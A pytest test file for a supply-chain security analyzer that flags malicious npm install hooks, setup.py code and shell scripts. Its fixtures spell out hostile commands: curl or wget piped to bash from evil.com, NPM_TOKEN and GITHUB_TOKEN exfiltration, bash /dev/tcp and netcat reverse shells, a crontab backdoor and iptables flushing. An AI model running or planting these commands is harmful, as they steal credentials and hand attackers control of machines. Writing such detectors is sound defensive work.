"""Thorough unit tests for depfence.analyzers.install_script."""
from __future__ import annotations

import asyncio
import json
from pathlib import Path

import pytest

from depfence.analyzers.install_script import InstallScriptAnalyzer
from depfence.core.models import FindingType, PackageId, PackageMeta, Severity


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _pkg(name: str = "test-pkg") -> PackageId:
    return PackageId("npm", name, "1.0.0")


def _meta(name: str = "test-pkg", has_install_scripts: bool = False) -> PackageMeta:
    return PackageMeta(pkg=_pkg(name), has_install_scripts=has_install_scripts)


def _run(coro):
    return asyncio.run(coro)


def _write(path: Path, content: str) -> Path:
    path.write_text(content)
    return path


def _pkg_json(tmp_path: Path, scripts: dict) -> Path:
    data = {"name": "test-pkg", "version": "1.0.0", "scripts": scripts}
    p = tmp_path / "package.json"
    p.write_text(json.dumps(data))
    return p


# ---------------------------------------------------------------------------
# analyze() — source_path guards
# ---------------------------------------------------------------------------

def test_analyze_no_source_path_no_install_scripts_returns_empty():
    analyzer = InstallScriptAnalyzer()
    findings = _run(analyzer.analyze(_meta(has_install_scripts=False), source_path=None))
    assert findings == []


def test_analyze_no_source_path_with_install_scripts_warns():
    analyzer = InstallScriptAnalyzer()
    meta = _meta(has_install_scripts=True)
    findings = _run(analyzer.analyze(meta, source_path=None))
    assert len(findings) == 1
    assert findings[0].finding_type == FindingType.INSTALL_SCRIPT
    assert findings[0].severity == Severity.MEDIUM


def test_analyze_missing_source_path_with_install_scripts_warns():
    analyzer = InstallScriptAnalyzer()
    meta = _meta(has_install_scripts=True)
    findings = _run(analyzer.analyze(meta, source_path=Path("/no/such/dir")))
    assert any(f.finding_type == FindingType.INSTALL_SCRIPT for f in findings)


def test_analyze_empty_source_dir_returns_empty(tmp_path):
    analyzer = InstallScriptAnalyzer()
    findings = _run(analyzer.analyze(_meta(), source_path=tmp_path))
    assert findings == []


# ---------------------------------------------------------------------------
# npm scripts — dangerous patterns
# ---------------------------------------------------------------------------

def test_detects_pipe_to_bash_in_postinstall(tmp_path):
    _pkg_json(tmp_path, {"postinstall": "curl http://evil.com/x.sh | bash"})
    analyzer = InstallScriptAnalyzer()
    findings = _run(analyzer.analyze(_meta(), tmp_path))
    assert any(f.severity == Severity.CRITICAL for f in findings)
    assert any("postinstall" in f.title for f in findings)


def test_detects_wget_pipe_to_sh(tmp_path):
    _pkg_json(tmp_path, {"postinstall": "wget http://evil.com/x | sh"})
    analyzer = InstallScriptAnalyzer()
    findings = _run(analyzer.analyze(_meta(), tmp_path))
    assert any(f.severity == Severity.CRITICAL for f in findings)


def test_detects_token_exfiltration_in_preinstall(tmp_path):
    _pkg_json(tmp_path, {"preinstall": "curl -d $NPM_TOKEN http://exfil.example.com"})
    analyzer = InstallScriptAnalyzer()
    findings = _run(analyzer.analyze(_meta(), tmp_path))
    assert any(f.severity == Severity.CRITICAL for f in findings)


def test_detects_github_token_exfiltration(tmp_path):
    _pkg_json(tmp_path, {"postinstall": "curl -d $GITHUB_TOKEN http://evil.com"})
    analyzer = InstallScriptAnalyzer()
    findings = _run(analyzer.analyze(_meta(), tmp_path))
    assert any(f.severity == Severity.CRITICAL for f in findings)


def test_detects_ssh_keygen_in_install(tmp_path):
    _pkg_json(tmp_path, {"install": "ssh-keygen -t rsa -f /tmp/id"})
    analyzer = InstallScriptAnalyzer()
    findings = _run(analyzer.analyze(_meta(), tmp_path))
    assert any(f.severity == Severity.CRITICAL for f in findings)


def test_detects_crontab_modification(tmp_path):
    _pkg_json(tmp_path, {"postinstall": "echo '* * * * * /tmp/backdoor' | crontab -"})
    analyzer = InstallScriptAnalyzer()
    findings = _run(analyzer.analyze(_meta(), tmp_path))
    assert any("crontab" in f.title.lower() or f.severity == Severity.HIGH for f in findings)


def test_detects_base64_decode_in_script(tmp_path):
    _pkg_json(tmp_path, {"postinstall": "echo aGVsbG8= | base64 -d | sh"})
    analyzer = InstallScriptAnalyzer()
    findings = _run(analyzer.analyze(_meta(), tmp_path))
    assert findings  # base64 decode should trigger


def test_non_install_hook_scripts_ignored(tmp_path):
    _pkg_json(tmp_path, {"test": "curl http://example.com | bash", "build": "webpack"})
    analyzer = InstallScriptAnalyzer()
    findings = _run(analyzer.analyze(_meta(), tmp_path))
    # 'test' and 'build' are not install hooks — no findings expected
    assert findings == []


def test_clean_npm_scripts_no_findings(tmp_path):
    _pkg_json(tmp_path, {"postinstall": "node scripts/setup.js"})
    analyzer = InstallScriptAnalyzer()
    findings = _run(analyzer.analyze(_meta(), tmp_path))
    assert findings == []


def test_malformed_package_json_returns_empty(tmp_path):
    (tmp_path / "package.json").write_text("{ not valid json }")
    analyzer = InstallScriptAnalyzer()
    findings = _run(analyzer.analyze(_meta(), tmp_path))
    assert findings == []


def test_package_json_without_scripts_key_returns_empty(tmp_path):
    (tmp_path / "package.json").write_text(json.dumps({"name": "pkg", "version": "1.0.0"}))
    analyzer = InstallScriptAnalyzer()
    findings = _run(analyzer.analyze(_meta(), tmp_path))
    assert findings == []


def test_finding_confidence_high_for_npm(tmp_path):
    _pkg_json(tmp_path, {"postinstall": "curl http://bad.com/x | bash"})
    analyzer = InstallScriptAnalyzer()
    findings = _run(analyzer.analyze(_meta(), tmp_path))
    assert all(f.confidence >= 0.9 for f in findings if f.finding_type == FindingType.INSTALL_SCRIPT)


# ---------------------------------------------------------------------------
# setup.py analysis
# ---------------------------------------------------------------------------

def test_detects_curl_pipe_in_setup_py(tmp_path):
    _write(tmp_path / "setup.py", "import os\nos.system('curl http://evil.com/x | bash')\n")
    analyzer = InstallScriptAnalyzer()
    findings = _run(analyzer.analyze(_meta(), tmp_path))
    assert any("setup.py" in f.title for f in findings)
    assert any(f.severity == Severity.CRITICAL for f in findings)


def test_detects_custom_install_command_with_network(tmp_path):
    src = (
        "from setuptools import setup\n"
        "from setuptools.command.install import install\n"
        "import urllib.request\n"
        "class CustomInstallCommand(install):\n"
        "    def run(self):\n"
        "        urllib.request.urlopen('http://evil.com')\n"
        "        install.run(self)\n"
        "setup(name='pkg', cmdclass={'install': CustomInstallCommand})\n"
    )
    _write(tmp_path / "setup.py", src)
    analyzer = InstallScriptAnalyzer()
    findings = _run(analyzer.analyze(_meta(), tmp_path))
    assert any("network" in f.title.lower() or "install command" in f.title.lower() for f in findings)


def test_clean_setup_py_no_findings(tmp_path):
    src = (
        "from setuptools import setup\n"
        "setup(name='mypkg', version='1.0', packages=['mypkg'])\n"
    )
    _write(tmp_path / "setup.py", src)
    analyzer = InstallScriptAnalyzer()
    findings = _run(analyzer.analyze(_meta(), tmp_path))
    assert findings == []


def test_setup_py_base64_decode_flagged(tmp_path):
    _write(tmp_path / "setup.py", "import os\nos.system('echo abc | base64 --decode | sh')\n")
    analyzer = InstallScriptAnalyzer()
    findings = _run(analyzer.analyze(_meta(), tmp_path))
    assert findings


# ---------------------------------------------------------------------------
# Shell script analysis
# ---------------------------------------------------------------------------

def test_detects_reverse_shell_in_sh(tmp_path):
    _write(tmp_path / "install.sh", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n")
    analyzer = InstallScriptAnalyzer()
    findings = _run(analyzer.analyze(_meta(), tmp_path))
    assert any(f.severity == Severity.CRITICAL for f in findings)


def test_detects_netcat_reverse_shell(tmp_path):
    _write(tmp_path / "setup.sh", "nc -e /bin/bash 10.0.0.1 4444\n")
    analyzer = InstallScriptAnalyzer()
    findings = _run(analyzer.analyze(_meta(), tmp_path))
    assert any(f.severity == Severity.CRITICAL for f in findings)


def test_detects_iptables_modification_in_sh(tmp_path):
    _write(tmp_path / "config.sh", "iptables -F && iptables -A INPUT -j ACCEPT\n")
    analyzer = InstallScriptAnalyzer()
    findings = _run(analyzer.analyze(_meta(), tmp_path))
    assert any("firewall" in f.title.lower() or "iptables" in f.title.lower() for f in findings)


def test_detects_etc_hosts_modification(tmp_path):
    _write(tmp_path / "patch.sh", "echo '1.2.3.4 evil.com' >> /etc/hosts\n")
    analyzer = InstallScriptAnalyzer()
    findings = _run(analyzer.analyze(_meta(), tmp_path))
    assert findings


def test_clean_shell_script_no_findings(tmp_path):
    _write(tmp_path / "build.sh", "#!/bin/sh\necho 'Building...'\nmake all\n")
    analyzer = InstallScriptAnalyzer()
    findings = _run(analyzer.analyze(_meta(), tmp_path))
    assert findings == []


def test_shell_script_finding_type(tmp_path):
    _write(tmp_path / "bad.sh", "curl http://bad.com | bash\n")
    analyzer = InstallScriptAnalyzer()
    findings = _run(analyzer.analyze(_meta(), tmp_path))
    assert all(f.finding_type == FindingType.INSTALL_SCRIPT for f in findings)


def test_shell_script_finding_confidence(tmp_path):
    _write(tmp_path / "bad.sh", "wget http://bad.com | sh\n")
    analyzer = InstallScriptAnalyzer()
    findings = _run(analyzer.analyze(_meta(), tmp_path))
    assert all(f.confidence >= 0.7 for f in findings)


# ---------------------------------------------------------------------------
# Multiple source types in the same directory
# ---------------------------------------------------------------------------

def test_combined_npm_and_shell_findings(tmp_path):
    _pkg_json(tmp_path, {"postinstall": "curl http://evil.com | bash"})
    _write(tmp_path / "extra.sh", "nc -e /bin/bash 10.0.0.1 9999\n")
    analyzer = InstallScriptAnalyzer()
    findings = _run(analyzer.analyze(_meta(), tmp_path))
    # Should have findings from both sources
    assert len(findings) >= 2


def test_package_identity_propagated(tmp_path):
    _pkg_json(tmp_path, {"postinstall": "curl http://evil.com | bash"})
    pkg = _pkg("my-evil-pkg")
    meta = PackageMeta(pkg=pkg)
    analyzer = InstallScriptAnalyzer()
    findings = _run(analyzer.analyze(meta, tmp_path))
    assert all(f.package == pkg for f in findings)
